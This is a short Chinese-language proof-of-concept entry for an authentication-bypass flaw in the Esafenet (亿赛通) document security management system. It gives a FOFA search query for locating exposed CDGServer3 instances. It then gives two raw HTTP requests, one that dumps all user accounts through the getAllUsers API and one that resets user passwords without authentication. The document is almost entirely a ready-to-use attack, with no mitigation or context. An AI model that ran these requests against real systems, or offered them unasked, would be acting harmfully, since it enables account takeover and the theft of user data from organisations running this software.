# 亿赛通电子文档安全管理系统getAllUsers身份绕过漏洞



## FOFA

```YAML
body="/CDGServer3/index.jsp"	
```

## poc

```java
POST /CDGServer3/openapi/getAllUsers HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

pageSize=10000&pageNumber=1




POST /CDGServer3/rpc/userManage/userPwdReset.js HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

userIds=test
```

